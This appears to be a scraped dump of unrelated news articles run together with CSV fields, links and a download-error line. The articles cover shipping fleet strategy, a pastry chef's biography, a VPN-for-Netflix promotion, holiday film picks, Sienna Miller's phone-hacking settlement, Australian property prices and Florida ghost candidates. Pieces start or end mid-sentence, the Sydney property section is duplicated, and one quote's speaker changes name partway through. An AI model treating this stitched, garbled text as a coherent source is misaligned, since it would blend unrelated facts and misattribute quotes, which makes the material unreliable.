Evangelos Marinakis-sponsored Capital Product Partners (NYSE: CPLP) took delivery of its latest liquefied natural gas (LNG) carrier on Nov. 29. The company went public as a product-tanker owner and ultimately transformed into a nearly pure owner of container ships. It now owns 15 container ships totaling 105352 TEUs and began diversifying into LNG shipping in late August buying six LNG vessels to date for a combined $1.2 billion.

Castor Maritime (NASDAQ: CTRM) was taken public as a pure dry bulk owner by the children of former Excel Maritime boss Gabriel Panayotides. Castor began diversifying into tankers in February. It now owns nine tankers in addition to 19 bulkers.

From mixed fleets to pure plays

Decisions of large players like Costamare and Navios might suggest the public pendulum is swinging toward mixed fleets. In fact there are new pure plays as well. There’s no trend in favor of one direction or the other.





On Dec. 3 StealthGas (NASDAQ: GASS) founded by Harry Vafias spun off a separately listed entity Imperial Petroleum (NASDAQ: IMPP). StealthGas had owned 45 liquefied petroleum gas (LPG) carriers three product tankers and one crude tanker. The spinoff created two pure plays: StealthGas kept the LPG ships and Imperial took the crude and product tankers.

On Nov. 30 dry bulk owner Diana Shipping (NYSE: DSX) backed by the Palios family spun off a separately listed entity OceanPal (NASDAQ: OP). Diana put three older bulkers focused on the spot market into OceanPal with Diana remaining focused on staggered time charters for newer ships. (Diana had previously spun off pure-play Diana Containerships in 2011. That company subsequently sold its container ships and transformed into a tanker pure play in 2020 renamed Performance Shipping [NASDAQ: PSHG].)

South Africa’s Grindrod Shipping (NASDAQ: GRIN) sold its remaining product tankers in April becoming a pure play on small-size bulk carriers.

Golar LNG (NYSE: GLNG) went public as an LNG shipowner then diversified into floating liquefaction and power plants. It sold its power-plant business in April and is going back to a targeted approach with a spinoff of its LNG carrier fleet from the floating liquefaction division. Golar announced Wednesday that eight of its LNG carriers would be sold to a new entity Cool Company (CoolCo) which will raise money and list in Oslo in Q1 2022. CoolCo will be 30% owned by Golar LNG and Idan Ofer-founded Eastern Pacific will be the largest shareholder.

This year also saw huge upside from an earlier pure-play move of Aristides Pittas’ Euroseas (NASDAQ: ESEA) which originally owned both container ships and bulkers. In 2018 its bulkers were spun off in a separately listed company EuroDry (NASDAQ: EDRY) rendering Euroseas a container-ship pure play. Between Jan. 1 and Sept. 1 Euroseas’ share price more than quadrupled.

Pros and cons of pure plays

Owners with ships in a single category are viewed as more understandable and attractive to investors.

If you want to bet that container leasing rates are going up you can buy shares in a company like Euroseas Danaos (NYSE: DAC) or Global Ship Lease (NYSE: GSL). If you think rates for Capesizes (bulkers of around 180000 DWT) will rise you can buy Seanergy (NASDAQ: SHIP) which specifically pitches itself as “the only pure-play Capesize company listed in the U.S.” If you believe in Suezmaxes (crude tankers with capacity of 1 million barrels) you can buy shares of Suezmax specialist Nordic American Tankers (NYSE: NAT).

Such companies provide commoditized bets on cyclical transport demand for the underlying cargo. Management decisions are largely limited to the spot versus time-charter ratio acquisitions and divestments and financial leverage.





Basil Karatzas founder of Karatzas Marine Advisors told American Shipper “Companies focused on one sector are easier for analysts to understand and model and it makes it easier for them to target specific institutional investors. It makes it easier for investors to understand whether they’re institutional or retail.” As for pure-play companies being little more commoditized bets he noted “That’s what some investors want.”

The problem for single-segment owners comes when demand in that segment collapses. “If the market goes your way it’s a great thing. But having all of your eggs in one basket can become very very critical in a bad market” warned Karatzas.

Pros and cons of mixed fleets

The traditional private model is to own ships across multiple segments buying assets at low prices when a particular segment troughs and selling them at high prices when a particular segment peaks using proceeds from sales of high-priced ships in one segment to buy low-priced ships in another.

The loftier cycle peaks from which family fortunes are made are rare usually separated by long stretches of rate weakness. Sector diversification gives private owners a better chance to survive lengthy cyclical lows so they can still be in the game when a big boom finally strikes.

According to Karatzas “As a private shipowner you would rather be in different markets because they typically do not bottom and peak at the same time and you have more room for error.”

Evercore ISI analyst Jon Chappell told American Shipper: “We think about the publicly traded companies because that’s what we do … but in the rest of the shipping world it’s not pure plays and the guys who have done incredibly well — who are not public — trade assets around different parts of the cycle.” The model on the private side said Chappell is about “someone who made four times their money on a 4000-TEU container ship and he’s able to sell that at the peak and buy some tanker assets at what he thinks is the trough.”

Navios Partners is now the closest thing to the private model in the public arena. During the Capital Link New York Maritime Forum in October Frangou maintained that her dry bulk-tanker-container platform has created scale resilience volatility mitigation and better capital access.

She said that income from healthy segments like containers can be “redeployed to get a better entry point at lower points in the cycle” in weak segments like tankers. She also said that high charters rates for Navios Partners’ container ships effectively translate into lower breakevens for its tankers.

The question ahead is whether shipping’s stock investors who are now primarily retail investors will be attracted to this. On one hand the decisions of a CEO matter a lot more with mixed fleets than with pure plays so there’s theoretically much more potential for a “management premium.” On the other hand mixed fleets are designed to smooth out the extreme highs and lows of shipping cycles and retail investors are attracted to shipping stocks by the extreme highs of the cycles.

According to Clarksons Platou Securities “In our view the jury is still out [on mixed fleets versus pure plays]. With Navios Partners … time will tell if that larger and diversified approach captures a wider audience.”

Drivers of public fleet decisions

When the topic of pure plays versus mixed fleets is debated on shipping conference panels — which happens often year after year — the implication is that there’s one right answer for the industry and public companies should strategically gravitate toward it.

That’s not how individual management teams make fleet decisions which explains why there are some companies going one way this year and other companies going the opposite direction.

When shipping companies go public they almost always debut with a pure-play model because that’s the easiest sell. That’s generally the moment when there is the most strategic or philosophical influence on the fleet-composition question.

Over time management sees opportunities arise that may compel a switch to a mixed-fleet model. Or management may have defensive reasons to make the switch. Then after public companies have evolved away from their initial pure plays some see new opportunities to make more money by splitting off a portion of the fleet and creating a pure play yet again.

In some instances when companies go from one segment to multiple segments “they may have found a way to opportunistically buy cheap ships [and add them to the public fleet] so it’s not strategic it’s opportunistic” said Karatzas. In other cases “these situations are the product of the [original] business model failing or the execution failing. It is not engineered. It is just an emergency solution because the original plan failed.”

The decision to create Navios Partners’ unique listed dry bulk-tanker-container platform arose just months before $398 million in bond debt matured for the group’s tanker arm Navios Acquisition.

Clarksons Platou Securities analyst Omar Nokta said at the time of the deal in late August: “We view this agreement as part rescue as [Navios Partners] is effectively bailing out [Navios Acquisition] ahead of its November bond maturity and part opportunistic as [Navios Partners] is acquiring a solid tanker fleet at an ideal countercyclical time.”

If you’re wondering how Guichon turned out to be the pastry genius that he is today we’ve dug up a few fun facts on him below.

He landed in the kitchen at an early age

Guichon spent most of his childhood in the Haute-Savoie region of France and at the young age of 14 he already had an inkling that the traditional school curriculum wasn’t for him and so he left for vocational school according to About Her.

He studied cooking for two years at France’s Thonon-les-Bains but was eventually lured to follow his true passion – pastries – and so he went off to Geneva Switzerland for a two-year apprenticeship to hone his craft. He then took a two-year curriculum of advanced pastry skills at the Maison Lenôtre in Paris France.

School of Chocolate isn’t his first TV appearance or reality show

In 2013 back in his home country Guichon became qualified to participate in the reality TV show Qui Sera le Prochain Grand Pâtissier? or Who Will be The Next Great Pastry Chef? Under the mentorship of famous pastry chefs Guichon competed against other up-and-coming patissiers and won third place.

His big break was thanks in large part to social media

It was around 2016 when Guichon decided to reveal his works on social media. On YouTube and Instagram he took his followers into his chocolate workshop giving them a glimpse into how he makes his art. Audiences responded to how detailed well-crafted and meticulous he was and his realistic larger-than-life works of chocolate deserved all the attention they were getting.

To date Guichon’s YouTube account boasts more than 200000 subscribers while his Instagram has 4.8 million followers.

He’s both a student and teacher of life

Ever-curious always thinking out of the box and overflowing with bright ideas Guichon is born to be an artist – and there’s no telling what he’ll create next. He’s travelled the world extensively and has taught his craft in more than 20 places from Europe to America to Asia through his series of masterclasses. He has also set up The Pastry Academy and continues to work as a consultant and instructor.

The chocolate architect has also published a book called The Art of Flavour which takes readers across the globe via Guichon’s signature creations coupled with his best techniques and secrets recipes and comprehensive guides.

His wife is behind the captivating photos of his masterpieces

Guichon is married to Fiona Guichon who is quite an artist herself. She owns a tattoo shop and is a very skilled photographer – as one will see in chef Guichon’s social media posts. Thanks to his wife’s beautiful photos Guichon’s chocolate masterpieces have been brought to the spotlight vividly coming to life on our screens.",https://news.google.com/articles/CBMiN2h0dHBzOi8vcHJvcHJpdmFjeS5jb20vdnBuL2d1aWRlcy9mcmVlLXZwbi1uZXRmbGl4LWhhY2vSAQA?hl=en-US&gl=US&ceid=US%3Aen,Can you get a Free VPN for Netflix? | You can with this hack,"Some countries have a bigger Netflix library than others due to licensing restrictions but you can always unblock this additional content by using a Virtual Private Network (VPN). Sadly Netflix has made this more difficult in recent years with detection systems that block VPN IP addresses.

While some VPNs have found a way to keep unblocking Netflix for their users the bad news is that you will have to pay for a premium VPN subscription to unblock Netflix reliably. The good news is that we have a hack to help you watch Netflix for free.

Can I get a free VPN for Netflix?

There are some free VPNs on the market that you can use to gain online privacy bypass local censorship and internet restrictions. However those free VPNs do not provide access to Netflix. Unblocking Netflix requires a lot of time and investment and free VPNs simply do not have the spending power to do the job.

Even if free VPNs did unblock Netflix (which they don’t) they always come with limitations such as download limits and connection speed restrictions. This makes them unsuitable for streaming.

So if free VPNs aren’t the solution what is the hack for watching more Netflix for free?

Private Internet Access is a VPN based in North America that can allow you to unblock the world’s most sought after Netflix catalog; Netflix US. Depending on where you live this can give you up to 70% more content to watch. Admittedly PIA does not unblock a massive list of Netflix catalogs. So why do we rate it so highly? If you are somebody who wants a VPN for privacy purposes (which is what they are for after all) this VPN is and always has been a favorite among Reddit users - who praise this VPN for its no logs policy that it has proven in court.

With PIA you get apps for all platforms that have a lot of customizable options these allow you to either tighten or weaken the encryption depending on what you need to do. Admittedly some of the features that come with PIA might not be required by most people. However if you want a VPN that does have this level of customizability then it is an excellent option that also unblocks Netflix US. You can test it risk free using its 30-day money back guarantee.

Find out what else your VPN can unblock

Unblocking Netflix is no mean feat for a VPN service. So you can be sure if it has Netflix capabilities it is also going to work with other services too.

To help we have tested all the VPNs we recommend in this guide with many popular services and list the ones we have had success with.",https://news.google.com/articles/CBMiOGh0dHBzOi8vdGhlZXZlcnlnaXJsLmNvbS9iZXN0LWhvbGlkYXktbW92aWVzLW9uLW5ldGZsaXgv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Netflix Holiday Movies Worth Watching This Year,"I am the opposite of most people in that I rarely appreciate the classics. I’m way too excited about the “new!” and “now!” to ever get attached to something “timeless.” Not to mention my affinity for the hidden gem—I’d rather go on and on to my best friends about a lipstick or TV show they’ve never heard of than drone on about Elf for the 100th time (not that it’s not good—I stan Zooey Deschanel like the rest of society). So this year I set out to watch all the Netflix holiday movies I could find.

Trust me there were some bad movies (and I don’t just mean cheesy) and there were some really bad movies (I stopped in the middle of about three because they were so awful). But there are quite a few gems that stood out to me that I’ll watch over and over again for holiday seasons to come. Grab some popcorn and cocoa and get to watching the movies on my very special approved list of Netflix holiday movies:

Notice how I specifically said the first one. I just did a marathon of both with my family and we all agreed that #2—while it’s cool to see Kurt and Goldie doing their thing—is just not that great. However the original Christmas Chronicles is a national treasure. It’s one of my favorite Christmas movies as of late. My mom and I even said we like Kurt Russel as Santa more than Tim Allen which is highly controversial but exactly how we like to be. Plus it’s one of many Christmas movies set in Chicago which I obviously love to see.

This movie is so lovely and sweet and I enjoyed every minute of it. It is certainly cheesy and exactly the level of acting I expect in one of these movies but I loved it nonetheless. It follows a rich single dad and his family who live a lavish life until the dad a radio host is fired from his job and realizes he has absolutely zero savings. They move back in with their aunt and have a low-key Christmas—against the wishes of all four kids. It obviously has a lovely romance that I cried over in the end because it was just so sweet and the chemistry between the kids and their dad made my heart sing (and miss my parents heavily).

I really rejected this movie all of 2019 but it’s 2021 and I’m here to admit that I honestly loved it. The love stories seemed real and made me so happy I could burst. I loved the character development and this movie was bursting at the seams with Christmas cheer unlike some of the other romances Netflix puts out. My absolute favorite sub-genre of Christmas movies is old-school ABC Family originals—Holiday in Handcuffs Santa Baby Christmas Cupid to name a few—and this gives me those vibes more than Hallmark or Lifetime Christmas movies (but I do love those too). But Baby V’s other Christmas movie on Netflix? No thank you. That was hot garbage.

I’ve loved Brooke Shields ever since she was Miley Stewart’s mom and I believe Lipstick Jungle is one of the most underrated 2000s shows. So when this came up on the front page of Netflix I ignored what I was originally searching for and watched it immediately. When a writer gets particularly bad reviews for her latest novel she’s looking for a holiday escape and decides to travel to Scotland where her grandfather used to live. She decides to buy herself a castle but the current owner is reluctant to sell and gives her quite the list of conditions—including moving in with him until Christmas.

It’s your standard Hallmark-esque romance holiday film but I loved it nonetheless. BRB just checking up on flights to Scotland for Christmas.

I’m sorry but did you really expect me to not talk about the holiday-themed show executive produced by the Nick Jonas? Dash & Lily is my current obsession. Unlike most I savored every bite of this show and watched it over a few weeks to make my obsession as drawn out and intense as humanly possible (It was nice for a moment but the emotional crash when I finished was concerning to say the least). This show made up of eight episodes all under 30 minutes would probably feel like a slightly longer movie (perhaps Avengers: End Game?) so if you’re concerned about time don’t be. This story follows two teenagers who are lonely during the holidays and decide to create a notebook of dares for them to complete around New York City. It has everything one could want: teen love Christmas in New York interesting fashion some lovely drama and a performance from the Jonas Brothers. Somebody pinch me—the perfect holiday show does exist.

This isn’t new by any means but I’ve seen a lot of Christmas Prince slander lately and I simply won’t stand for it. This was one of the first Netflix original Christmas movies I watched so it holds a special place in my heart. It follows the traditional Lifetime/Hallmark movie format we all know and love: girl from small town meets a guy realizes he’s a prince they fall in love people don’t want them to be together an old flame comes into town and the girl and prince must decide if their love can handle the obstacles royal life will throw at them. It’s cheesy and predictable but we love it anyway.

I didn’t watch The Vampire Diaries so this was the first movie that made me realize that I am utterly in love with Kat Graham. In this she’s reunited with her best friend who’s been traveling the world and also happens to be incredibly hot (of course) all while she’s stuck in her hometown in a job she hates. She inherits an old Advent calendar and realizes it actually starts predicting her future—including a romance! Ooh!

If you’re anticipating yet another holiday season filled with the “why are you still single?” questions I found your movie. Sloane and Jackson feel the same so when they meet during a very bad Christmas season they make a pact: be each other’s “holidate” for every function throughout the year. Filled with laughs and a very hot Australian accent this adorable movie is one of the most underrated of Netflix’s catalog.

I am not normally a romance person but I make an exception for The Holiday. I could watch it on loop and never get bored no matter what time of year it is. Two women going through break-ups in sunny Los Angeles and snowy England swap houses for the holidays to get away. Jude Law is a dreamboat and the Nancy Meyers vibes are immaculate. If you want something not super Christmas-y but with a cozy winter atmosphere look no further.

Netflix has done catfish movies before (ahem Sierra Burgess is a Loser) and I have not been particularly impressed. I watched Love Hard on a whim just to see how much it would disappoint me—and I walked away a fan. Natalie a writer with a column all about bad dates (the reporter trope will never ever get old) is ready to actually meet someone worthwhile so when she meets Josh on a Tinder-like app she’s pretty quickly smitten. She decides to travel across the country to spend Christmas with him only to discover he looks nothing like his photos—but the certified hottie in the pics (Tag) actually lives in this town. Josh promises Natalie he’ll help her hook up with Tag if she pretends to be his girlfriend through Christmas.

I appreciated that it was never about Josh not being “attractive” enough for her and the connection the two have is undeniable. I was rooting for their relationship from the get-go. For a less-creepy rendition of “Baby It’s Cold Outside” a hilarious group of elderly people learning to online date and a sweet love story I can’t recommend Love Hard more.

OK this choice is absolutely cheating for many reasons. For one it is on Hulu. And second I didn’t actually love this movie. Let me backtrack: I was beyond excited for this movie because I’ve been craving a queer holiday romance and the cast seemed impeccable. I watched it the first night it released on Hulu and while I enjoyed myself watching the movie I was disappointed—to say the least—at some of the choices they made with the character development. Some of the characters seemed really toxic even though you’re supposed to like them and it expressed three different coming-out stories that were really traumatic which was the opposite of how I wanted to feel going into this movie.

However with all of that said I’m still adding it to this list and recommending it to everyone I know because I want directors screenwriters actors producers and networks to know that we want more queer holiday movies! I am begging you: Please give me more and ideally make them star Aubrey Plaza because whooooey."

She was speaking after settling a phone-hacking claim with the tabloid´s publisher.

The 39-year-old star brought legal action against News Group Newspapers (NGN) over alleged voicemail interception and misuse of private information in September 2019.

The publisher part of Rupert Murdoch´s News Corp empire denied illegal information gathering and agreed to settle for ""substantial damages"" without admitting liability.

Sienna Miller outside court said she had wanted to take the Sun to trial - but could not afford the risk of millions in costs.

“They very nearly ruined my life.”

She also named Rebekah Brooks a British media executive and former journalist and newspaper editor. She has been chief executive officer of News UK since 2015.

Miller said she hopes someone with more money than her can take the newspaper to trial

Commenting on her remarks ""Finding Freedom"" author wrote Omid Scobie wrote ""Prince Harry enters the chat."" He was apparently referring to the recent privacy victory of Harry's wife Meghan Markle against a UK's tabloid.

Last week Meghan Markle called for a reform of tabloid culture after winning a second court victory against Britain´s Associated Newspapers for breach of privacy.

She said the industry ""conditions people to be cruel and profits from the lies and pain that they create"".

According to Omid Scobie ""Sienna Miller's payout may be one of the largest by The Sun to a phone hacking victim and per her court statement ""tantamount"" to an admission of illegal activity. As well as privacy invasion her lawyers believe the paper paid for medical records to confirm her '05 pregnancy.""",https://news.google.com/articles/CBMikwFodHRwczovL3d3dy5kYWlseXRlbGVncmFwaC5jb20uYXUvbmV3cy9uc3cvYW50aG9ueS1hbGJhbmVzZS13b250LWJhY2stZ292ZXJubWVudHMtbWFzcy1pbW1pZ3JhdGlvbi1wbGFuL25ld3Mtc3RvcnkvMzI1YWU2Y2JhYmMxYjJmYjA2YjBkZGUwZmNkMWViZWHSAZcBaHR0cHM6Ly93d3cuZGFpbHl0ZWxlZ3JhcGguY29tLmF1L25ld3MvbnN3L2FudGhvbnktYWxiYW5lc2Utd29udC1iYWNrLWdvdmVybm1lbnRzLW1hc3MtaW1taWdyYXRpb24tcGxhbi9uZXdzLXN0b3J5LzMyNWFlNmNiYWJjMWIyZmIwNmIwZGRlMGZjZDFlYmVhP2FtcA?hl=en-US&gl=US&ceid=US%3Aen,Albanese won’t back return of mass immigration,ERROR: Article `download()` failed with 403 Client Error: Forbidden for url: https://www.dailytelegraph.com.au/news/nsw/anthony-albanese-wont-back-governments-mass-immigration-plan/news-story/325ae6cbabc1b2fb06b0dde0fcd1ebea on URL https://news.google.com/articles/CBMikwFodHRwczovL3d3dy5kYWlseXRlbGVncmFwaC5jb20uYXUvbmV3cy9uc3cvYW50aG9ueS1hbGJhbmVzZS13b250LWJhY2stZ292ZXJubWVudHMtbWFzcy1pbW1pZ3JhdGlvbi1wbGFuL25ld3Mtc3RvcnkvMzI1YWU2Y2JhYmMxYjJmYjA2YjBkZGUwZmNkMWViZWHSAZcBaHR0cHM6Ly93d3cuZGFpbHl0ZWxlZ3JhcGguY29tLmF1L25ld3MvbnN3L2FudGhvbnktYWxiYW5lc2Utd29udC1iYWNrLWdvdmVybm1lbnRzLW1hc3MtaW1taWdyYXRpb24tcGxhbi9uZXdzLXN0b3J5LzMyNWFlNmNiYWJjMWIyZmIwNmIwZGRlMGZjZDFlYmVhP2FtcA?hl=en-US&gl=US&ceid=US%3Aen,https://news.google.com/articles/CBMifWh0dHBzOi8vd3d3LnJlYWxlc3RhdGUuY29tLmF1L25ld3Mvc3lkbmV5LWhvbWVvd25lcnMtd2hvLWhhdmUtd29uLXRoZS1sb3R0ZXJ5LWFzLWEtcmVzdWx0LW9mLXJlY2VudC1yZWFsLWVzdGF0ZS1wcmljZS1ncm93dGgv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Sydney homeowners who have 'won the lottery' as a result of recent real estate price growth - realestate.com.au,"Homeowners in pockets of Sydney have struck the jackpot after watching the value of their properties increase by up to $2.8 million in just five years.

Housing economists said the wealth generation over such a short period was tantamount to residents holding a winning lottery ticket simply for their choice of where to live.

Data provided by realestate.com.au showed the biggest value rises over the past five years were in beachside suburbs across Sydney’s north and east.

Many were less accessible areas that became more popular during the Covid-era as work from home arrangements made an easy commute to the CBD less of a priority.

This included peninsula suburb Palm Beach in Sydney’s north which was the country’s top performing suburb over the period.

Properties in the suburb typically cost $2.4 million in 2016 but now command a median of $5.2 million – an increase of $2.8 million.

Other suburbs with a more than $2 million increase in median values included Vaucluse Bronte Bellevue Hill and Dover Heights.

Byron Bay had the biggest rise of a suburb outside the Sydney metro area with the median value of homes increasing $1.85 million.

Realestate.com.au economist Anne Flaherty said Sydney homeowners “won the lottery” as a result of this price growth.

“Around Australia property owners in beachside suburbs have seen the largest price growth gains over the past five years” Ms Flaherty said.

“The rise in remote working and desire for lifestyle in the wake of Covid has been a key contributor to this growth with demand in Sydney unlikely to waver anytime soon.”

LJ Hooker Palm Beach Principal David Edwards who has been selling properties for over 30 years in Palm Beach and Whale Beach said the area had experienced a high level of growth in the 2019-2021 period.

“Palm Beach is often defined by buyers who are seeking the idyllic lifestyle. It’s a boutique investment market for people looking at buying their dream home domestically” Mr Edwards said.

“In the past the suburb has been undervalued. When compared to other big coastal suburbs Palm Beach stands out since it’s a 40 minute drive to the Sydney CBD – making it enticing for aspirational or corporate buyers.”

Vaucluse came in second place in the state topping Greater Sydney with a 50 per cent or $2262000 difference in median prices.

Positioned on the South Head peninsula in Sydney’s east between Rose Bay and Watsons Bay the suburb is considered one of the ritziest neighbourhoods in the Harbour City.

Russian born marketing mentor Oksana Dragoti stumbled upon the suburb when she and her husband Stefano were looking to buy a property in Sydney more than a decade ago.

Her apartment at 2/731 Old South Head Road brought to market by Richardson & Wrench Bondi Junction Principal Andre Frack and agent Marc Burman last sold in 2010 for $600000 according to CoreLogic.

It’s now headed for auction on the 16th December with a price guide of $1.65 million to $1.7 million.

“When we were looking for a place to buy in Sydney we asked about 20 friends where they would recommend. Every person said Vaucluse was the best” Ms Koriakova said.

“It’s a very safe village you could almost leave your car open and no one would steal it!”

With the enclosed swimming areas at Nielsen Park and Parsley Bay close by Ms Koriakova said she enjoyed going for a swim and taking in the fresh air of a coastal walk.

The ease of accessibility to ferries that go to Watson’s Bay and Rose Bay also added to the suburb’s appeal.

“Vaucluse has very beautiful natural surroundings every property provides an opportunity to make the most of the area” Ms Koriakova said.

“Neighbours in the area want someone nice [to buy next door]. In Vaucluse you always know who they are and can appreciate their cultural values – people look out for one another.”

Bronte scored the bronze with a 73 per cent or $2225000 difference in median prices.

It’s not just Sydney suburbs that have won the jackpot when it comes to median price growth there have also been some surprises from coastal areas like Killcare Heights and Byron Bay.

Byron in particular is an interesting example of a coastal suburb which experienced unprecedented market growth during the past 12 months.

Kollosche real estate agent Kim Jones operates in the Byron Shire and says the number of properties which were being bought sight unseen – not physically viewed by the buyer – shot up during the pandemic.

“Ordinarily buyers love to ‘touch and feel’ a property. They love to get a sense of what a place feels like to walk through” Ms Jones said.

“Locals are benefiting from the surge in people from Sydney buying up properties … it peaked in October this year and could go on to plateau and level out over the coming months.”

LJ Hooker Head of Research and Business Intelligence Mathew Tiller says a range of factors have influenced price growth across the NSW market including low interest rates expats returning from overseas and buyers reassessing where they want to live.

“People who may not be able to afford buying a property on the Northern Beaches or Eastern Suburbs may consider relocating to the comparably cheaper Blue Mountains or Central Coast” Mr Tiller said

“Having the extra wealth accumulated over the years since an owner initially bought a property makes people more comfortable to structure their portfolio and potentially secure future investment properties.”

“It also allows them to spend on big ticket items like holiday houses upsizing to a bigger home and using their income to help their children buy their first home.”

Housing affordability still remains a major issue for those who don’t live in areas experiencing high levels of growth – or don’t yet own their own home.

This deteriorating affordability makes it harder for first home buyers to enter the market as potential owners would need to set aside more money to pay for a house deposit.

Ms Flaherty predicts that the property market will continue to stay strong over the next 12 months and believes median prices will remain increasingly high for some time.

“Because international and interstate travel was off the cards for most of 2020 and 2021 it meant that there were a higher proportion of cashed up buyers who were able to afford places that were previously beyond their price range” Ms Flaherty said.

“As interest rates dropped it meant that people were able to increase their savings. Young couples looking to start a family also benefited from a potential upscaling by relocating.”

Housing economists said the wealth generation over such a short period was tantamount to residents holding a winning lottery ticket simply for their choice of where to live.

Data provided by realestate.com.au showed the biggest value rises over the past five years were in beachside suburbs across Sydney’s north and east.

Many were less accessible areas that became more popular during the Covid-era as work from home arrangements made an easy commute to the CBD less of a priority.

This included peninsula suburb Palm Beach in Sydney’s north which was the country’s top performing suburb over the period.

Properties in the suburb typically cost $2.4 million in 2016 but now command a median of $5.2 million – an increase of $2.8 million.

Other suburbs with a more than $2 million increase in median values included Vaucluse Bronte Bellevue Hill and Dover Heights.

Byron Bay had the biggest rise of a suburb outside the Sydney metro area with the median value of homes increasing $1.85 million.

Realestate.com.au economist Anne Flaherty said Sydney homeowners “won the lottery” as a result of this price growth.

“Around Australia property owners in beachside suburbs have seen the largest price growth gains over the past five years” Ms Flaherty said.

“The rise in remote working and desire for lifestyle in the wake of Covid has been a key contributor to this growth with demand in Sydney unlikely to waver anytime soon.”

LJ Hooker Palm Beach Principal David Edwards who has been selling properties for over 30 years in Palm Beach and Whale Beach said the area had experienced a high level of growth in the 2019-2021 period.

“Palm Beach is often defined by buyers who are seeking the idyllic lifestyle. It’s a boutique investment market for people looking at buying their dream home domestically” Mr Edwards said.

“In the past the suburb has been undervalued. When compared to other big coastal suburbs Palm Beach stands out since it’s a 40 minute drive to the Sydney CBD – making it enticing for aspirational or corporate buyers.”

Vaucluse came in second place in the state topping Greater Sydney with a 50 per cent or $2262000 difference in median prices.

Positioned on the South Head peninsula in Sydney’s east between Rose Bay and Watsons Bay the suburb is considered one of the ritziest neighbourhoods in the Harbour City.

Russian born marketing mentor Oksana Dragoti stumbled upon the suburb when she and her husband Stefano were looking to buy a property in Sydney more than a decade ago.

Her apartment at 2/731 Old South Head Road brought to market by Richardson & Wrench Bondi Junction Principal Andre Frack and agent Marc Burman last sold in 2010 for $600000 according to CoreLogic.

It’s now headed for auction on the 16th December with a price guide of $1.65 million to $1.7 million.

“When we were looking for a place to buy in Sydney we asked about 20 friends where they would recommend. Every person said Vaucluse was the best” Ms Koriakova said.

“It’s a very safe village you could almost leave your car open and no one would steal it!”

With the enclosed swimming areas at Nielsen Park and Parsley Bay close by Ms Koriakova said she enjoyed going for a swim and taking in the fresh air of a coastal walk.

The ease of accessibility to ferries that go to Watson’s Bay and Rose Bay also added to the suburb’s appeal.

“Vaucluse has very beautiful natural surroundings every property provides an opportunity to make the most of the area” Ms Koriakova said.

“Neighbours in the area want someone nice [to buy next door]. In Vaucluse you always know who they are and can appreciate their cultural values – people look out for one another.”

New data from REA Group shows the median house price in leafy Tallebudgera Valley is up a whopping $746250 or 94 per cent over five years.

The beachside suburb of Mermaid Beach jumped $705000 or 51 per cent while Currumbin is up a healthy $677750 (94%) and Palm Beach recorded a gain of $621500 (88%).

REA PropTrack economist Anne Flaherty said property owners in beachside suburbs across Australia had seen the largest price growth gains over the past five years.

“The rise in remote working and desire for lifestyle in the wake of Covid-19 has been a key contributor to this growth with demand unlikely to waver anytime soon” she said.

REIQ Gold Coast chairman Andrew Henderson said when looking at all four Coast suburbs it was obvious buyers were opting for a beach or tree-change lifestyle.

“When you look at Tallebudgera Valley it offers large rural properties that are close to major infrastructure and the beach” Mr Henderson said.

“It gives people the best of both worlds and for a long time that area was underrated.

“Mermaid Beach Palm Beach and Currumbin are prime residential areas on the beach.

“It gives people a holiday feel all year round and great access to restaurants and cafes.

“They’re all the best suburbs for what they offer – the beach or that feel of being rural.”

Ray White Tugun agent Ken Jacob has lived in Tallebudgera Valley for more than 17 years and said the huge price rises were a shock to many homeowners.

He said Tallebudgera Valley offered a secluded lifestyle that buyers were willing to pay a premium for.

“It’s lifestyle driven” Mr Jacob said.

“People want to be away from the city and have some space grow some veggies have some chooks and wake up to peace and quiet.

“I don’t know of anywhere else in Australia where you can be in a subtropical green place like Tallebudgera Valley yet be so close to yet to a major city and what the Gold Coast offers.”

CASE STUDY: “We bought here for the lifestyle”

When Josie and Richard Scott bought their home in Palm Beach for $590000 in 2016 they worried they had paid too much.

Five years on and the couple are laughing all the way to the bank after Palm Beach was identified as one of the suburbs in QLD to undergo unprecedented house price growth with the suburb’s median price rising 88 per cent from $703500 to $1.325 million over the period.

Today Josie and Richard count themselves fortunate to have bought the two-storey three-bedroom home when they did and have since added an extra bedroom and bathroom.

“We have no intention of moving but a similar house down the road in original and far worse condition just sold for $1.1 million” Josie said.

“We are blown away by how much the prices have risen and our hearts go out to those people trying to get on to the property ladder now.”

Yet the Scott family never intended to live in the suburb.

“It was a fluke we ended up here” Josie said.

“When we were house-hunting we weren’t looking for an area that we thought would have massive growth we simply bought for the lifestyle. Having just moved back to Australia from London I only had one non-negotiable which was to be within a 20-minute walk of a body of water” she said.

“Palm Beach just happened to fit the bill and even though the house was a renovator’s delight we were thrilled to be so close to the things that the Gold Coast has to offer with plenty of space for the kids.”

Josie said the rapid rise in Palm Beach house prices had the added effect of making their mortgage more affordable.

“We have since refinanced because the prices have gone up so much. Our renovation which at times felt overwhelming and potentially out of reach no longer feels daunting. So we’ve been lucky two-fold.”

José Javier Rodríguez a Democrat.

According to investigators Artiles reportedly paid an auto salesman with the same surname as Rodríguez to run as a third-party ""ghost"" candidate against Rodríguez and his then-Republican challenger state Sen. Ileana Garcia. Farcical as it sounds it worked. The auto salesman despite never campaigning likely siphoned off 6300 votes from Rodríguez's re-campaign to ensure Garcia's victory.

Now new revelations suggest that Artiles the alleged mastermind may have just been the tip of the iceberg.

This week the Orlando Sentinel reported that there was likely an entire ecosystem of corporate and political entities propping up sham candidates in the 2020 Florida state Senate races. Records reviewed by the Sentinel indicate that Florida Power & Light (FPL) the country's largest electricity company helped coordinate three separate ghost candidates – one of whom was Rodríguez – in order to bolster its own business interests in the state legislature. From 2016 to 2020 FPL reportedly made a series of transactions totaling over $3 million to Denver-based dark-money nonprofit ""Grow United"" whose name was changed from ""Proclivity"" last year. In October of 2020 Grow United gifted two Florida political committees – ""The Truth"" and ""Our Florida"" – with $550000 to finance the mass delivery of political mailers supporting three unaffiliated candidates in three districts. Thousands of these mailers – all of which featured identical language blasting ""party line"" politicians as ""puppets"" according to Politico – bombarded voters.

It was ""a coordinated dark money effort to siphon votes from Democratic candidates"" Anders Croy a Democratic caucus' spokesman told The Miami Herald.

According to the Sentinel  a printing company with ties to Florida GOP strategist Alex Alvarado was in charge of producing the mailers themselves. Incidentally Alvarado's data intelligence firm was paid hundreds of thousands of dollars by political groups with ties to Associated Industries of Florida a business lobbying group that represents FPL.

Alissa Jean Schafer a research and communications manager at the Energy and Policy Institute (EPI) a utilities and energy watchdog told Salon that FPL's presence in this opaque web of nonprofits companies and political committees is completely unsurprising.

